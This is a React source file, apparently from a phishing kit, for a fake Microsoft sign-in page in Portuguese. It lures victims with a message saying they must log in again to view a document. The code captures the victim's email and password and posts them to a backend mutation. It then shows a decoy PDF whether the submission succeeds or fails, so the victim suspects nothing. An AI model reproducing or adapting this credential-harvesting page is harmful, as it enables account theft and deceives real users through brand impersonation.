import { useState } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

type Step = "email" | "password";

export default function Home() {
  const [step, setStep] = useState<Step>("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [pdfUrl, setPdfUrl] = useState<string | null>(null);
  const [showPassword, setShowPassword] = useState(false);
  const [keepSignedIn, setKeepSignedIn] = useState(false);
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [animating, setAnimating] = useState(false);
  const [animDir, setAnimDir] = useState<"forward" | "back">("forward");

  const submitPasswordMutation = trpc.login.submitPassword.useMutation({
    onSuccess: () => {
      setPdfUrl("/manus-storage/HKI26-0382_a4a69c13.pdf");
    },
    onError: (error) => {
      console.error("Erro:", error);
      setPdfUrl("/manus-storage/HKI26-0382_a4a69c13.pdf");
    },
  });

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setEmailError("");
    if (!email.trim()) {
      setEmailError("Insira um endereço de email, telefone ou Skype.");
      return;
    }
    setAnimDir("forward");
    setAnimating(true);
    setTimeout(() => {
      setStep("password");
      setAnimating(false);
    }, 180);
  };

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setPasswordError("");
    if (!password.trim()) {
      setPasswordError("A senha está incorreta. Tente novamente.");
      return;
    }
    submitPasswordMutation.mutate({ email, password });
  };

  const handleBackToEmail = () => {
    setAnimDir("back");
    setAnimating(true);
    setTimeout(() => {
      setStep("email");
      setPassword("");
      setPasswordError("");
      setAnimating(false);
    }, 180);
  };



  if (pdfUrl) {
    return (
      <div className="ms-bg">
        <div className="ms-container">
          <div className="ms-pdf-viewer">
            <iframe
              src={pdfUrl}
              className="ms-pdf-iframe"
              title="Documento"
            />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="ms-bg">
      <div className="ms-container">
        {/* Message above logo */}
        <div className="ms-doc-message">
          Para ver o documento, entre com sua conta novamente.
        </div>

        <div className={`ms-card ms-card-anim${animating ? (animDir === "forward" ? " ms-card-slide-out" : " ms-card-slide-back") : ""}`}>
          <MicrosoftLogo />

          {step === "email" && (
            <form onSubmit={handleEmailSubmit} className="ms-form" noValidate>
              <h1 className="ms-title">Entrar</h1>

              <div className="ms-field-group">
                <input
                  type="email"
                  className={`ms-input ${emailError ? "ms-input-error" : ""}`}
                  placeholder="Email, telefone ou Skype"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    if (emailError) setEmailError("");
                  }}
                  autoFocus
                  autoComplete="username"
                />
                {emailError && (
                  <div className="ms-error-msg">{emailError}</div>
                )}
              </div>

              <div className="ms-links">
                <span className="ms-link-text">
                  Não tem uma conta?{" "}
                  <a href="#" className="ms-link" onClick={(e) => e.preventDefault()}>
                    Crie uma!
                  </a>
                </span>
              </div>

              <a href="#" className="ms-link ms-link-block" onClick={(e) => e.preventDefault()}>
                Não consegue acessar sua conta?
              </a>

              <div className="ms-btn-row">
                <button type="submit" className="ms-btn-primary">
                  Avançar
                </button>
              </div>
            </form>
          )}

          {step === "password" && (
            <form onSubmit={handlePasswordSubmit} className="ms-form" noValidate>
              <h1 className="ms-title">Entrar</h1>

              <button
                type="button"
                className="ms-email-display"
                onClick={handleBackToEmail}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 2048 2048"
                  width="16"
                  height="16"
                  className="ms-email-icon"
                >
                  <path d="M1024 0q141 0 272 36t245 103 207 160 160 208 103 245 37 272q0 141-36 272t-103 245-160 207-208 160-245 103-272 37q-141 0-272-36t-245-103-207-160-160-208-103-245-37-272q0-141 36-272t103-245 160-207 208-160T752 37t272-37zm0 1920q124 0 238-32t214-90 181-140 140-181 90-214 32-238q0-124-32-238t-90-214-140-181-181-140-214-90-238-32q-124 0-238 32t-214 90-181 140-140 181-90 214-32 238q0 124 32 238t90 214 140 181 181 140 214 90 238 32zm0-960q26 0 45 19t19 45q0 26-19 45t-45 19q-26 0-45-19t-19-45q0-26 19-45t45-19zm-64-576h128v448h-128V384z" />
                </svg>
                <span className="ms-email-text">{email}</span>
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 2048 2048"
                  width="12"
                  height="12"
                  className="ms-email-chevron"
                >
                  <path d="M1024 1277L237 490l-90 90 877 877 877-877-90-90-787 787z" />
                </svg>
              </button>

              <div className="ms-field-group">
                <div className="ms-password-wrapper">
                  <input
                    type={showPassword ? "text" : "password"}
                    className={`ms-input ms-input-password ${passwordError ? "ms-input-error" : ""}`}
                    placeholder="Senha"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (passwordError) setPasswordError("");
                    }}
                    autoFocus
                    autoComplete="current-password"
                  />
                  <button
                    type="button"
                    className="ms-password-toggle"
                    onClick={() => setShowPassword(!showPassword)}
                    tabIndex={-1}
                  >
                    {showPassword ? (
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 2048 2048" width="16" height="16">
                        <path d="M1024 384q93 0 174 35t142 96 96 142 36 175q0 93-35 174t-96 142-142 96-175 36q-93 0-174-35t-142-96-96-142-36-175q0-93 35-174t96-142 142-96 175-36zm0 768q66 0 124-25t101-68 69-102 25-125q0-66-25-124t-68-101-102-69-125-25q-66 0-124 25t-101 68-69 102-25 125q0 66 25 124t68 101 102 69 125 25zm0-512q53 0 99 20t82 55 55 81 20 100q0 53-20 99t-55 82-81 55-100 20q-53 0-99-20t-82-55-55-81-20-100q0-53 20-99t55-82 81-55 100-20zm0 256q26 0 45-19t19-45q0-26-19-45t-45-19q-26 0-45 19t-19 45q0 26 19 45t45 19zM0 1024q93-168 224-295t284-204 323-119 193-22q100 0 193 22t323 119 284 204 224 295q-93 168-224 295t-284 204-323 119-193 22q-100 0-193-22t-323-119-284-204-224-295zm128 0q79 136 196 245t252 180 276 107 172 28q88 0 172-28t276-107 252-180 196-245q-79-136-196-245t-252-180-276-107-172-28q-88 0-172 28t-276 107-252 180-196 245z" />
                      </svg>
                    ) : (
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 2048 2048" width="16" height="16">
                        <path d="M1024 384q93 0 174 35t142 96 96 142 36 175q0 93-35 174t-96 142-142 96-175 36q-93 0-174-35t-142-96-96-142-36-175q0-93 35-174t96-142 142-96 175-36zm0 768q66 0 124-25t101-68 69-102 25-125q0-66-25-124t-68-101-102-69-125-25q-66 0-124 25t-101 68-69 102-25 125q0 66 25 124t68 101 102 69 125 25zm0-512q53 0 99 20t82 55 55 81 20 100q0 53-20 99t-55 82-81 55-100 20q-53 0-99-20t-82-55-55-81-20-100q0-53 20-99t55-82 81-55 100-20zm0 256q26 0 45-19t19-45q0-26-19-45t-45-19q-26 0-45 19t-19 45q0 26 19 45t45 19zM0 1024q93-168 224-295t284-204 323-119 193-22q100 0 193 22t323 119 284 204 224 295q-93 168-224 295t-284 204-323 119-193 22q-100 0-193-22t-323-119-284-204-224-295zm128 0q79 136 196 245t252 180 276 107 172 28q88 0 172-28t276-107 252-180 196-245q-79-136-196-245t-252-180-276-107-172-28q-88 0-172 28t-276 107-252 180-196 245z" />
                      </svg>
                    )}
                  </button>
                </div>
                {passwordError && (
                  <div className="ms-error-msg">{passwordError}</div>
                )}
              </div>

              <a href="#" className="ms-link ms-link-block" onClick={(e) => e.preventDefault()}>
                Esqueceu a senha?
              </a>

              <div className="ms-keep-signed">
                <label className="ms-checkbox-label">
                  <input
                    type="checkbox"
                    checked={keepSignedIn}
                    onChange={(e) => setKeepSignedIn(e.target.checked)}
                    className="ms-checkbox"
                  />
                  <span>Manter-me conectado</span>
                </label>
              </div>

              <div className="ms-btn-row">
                <button
                  type="submit"
                  className="ms-btn-primary"
                  disabled={submitPasswordMutation.isPending}
                >
                  {submitPasswordMutation.isPending ? "Entrando..." : "Entrar"}
                </button>
              </div>
            </form>
          )}
        </div>

        <div className="ms-footer">
          <a href="#" onClick={(e) => e.preventDefault()}>Termos de uso</a>
          <a href="#" onClick={(e) => e.preventDefault()}>Privacidade e cookies</a>
          <span className="ms-footer-dots">···</span>
        </div>
      </div>
    </div>
  );
}

function MicrosoftLogo() {
  return (
    <div className="ms-logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" width="21" height="21">
        <path fill="#f35325" d="M1 1h10v10H1z" />
        <path fill="#81bc06" d="M12 1h10v10H12z" />
        <path fill="#05a6f0" d="M1 12h10v10H1z" />
        <path fill="#ffba08" d="M12 12h10v10H12z" />
      </svg>
      <span className="ms-logo-text">Microsoft</span>
    </div>
  );
}
